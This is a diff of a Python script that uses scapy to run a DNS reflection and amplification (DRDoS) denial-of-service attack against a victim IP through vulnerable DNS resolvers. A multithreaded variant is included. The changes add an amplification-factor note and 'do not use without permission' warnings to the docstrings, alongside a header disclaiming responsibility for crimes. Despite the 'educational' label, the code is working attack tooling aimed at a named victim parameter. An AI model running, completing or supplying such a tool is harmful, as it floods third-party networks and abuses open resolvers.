@@ -7,6 +7,9 @@
 |  https://www.us-cert.gov/ncas/alerts/TA13-088A                                                                        |
 |  I am NOT responsible for any damages caused or any crimes committed by using this tool.                              |
 #########################################################################################################################
+
+Bandwidth Amplification Factor - 28 to 54
+
 '''
 
 from scapy.all import IP, UDP, DNS, DNSQR, send
@@ -14,7 +17,7 @@ from concurrent.futures import ThreadPoolExecutor
 
 def simulate_dns_dr_dos(target_ip, dns_server, domain="example.com", num_packets=10):
     """
-    Simula um ataque DRDoS DNS para fins educativos.
+    Simula um ataque DRDoS DNS para fins educativos. Não utilize esse script em servidores e redes sem permissão.
     :param target_ip: IP da vítima que receberá os pacotes amplificados.
     :param dns_server: Servidor DNS vulnerável para enviar as solicitações.
     :param domain: Nome de domínio para a consulta DNS amplificada.
@@ -32,7 +35,7 @@ def simulate_dns_dr_dos(target_ip, dns_server, domain="example.com", num_packets
 
 def simulate_dns_dr_dos_multiple(target_ip, dns_servers, domain="example.com", num_packets_per_server=10, num_threads=4):
     """
-    Simula um ataque DRDoS DNS contra múltiplos servidores simultaneamente.
+    Simula um ataque DRDoS DNS contra múltiplos servidores simultaneamente. Não utilize esse script em servidores e redes sem permissão.
     :param target_ip: IP da vítima que receberá os pacotes amplificados.
     :param dns_servers: Lista de servidores DNS vulneráveis para enviar as solicitações.
     :param domain: Nome de domínio para a consulta DNS amplificada.
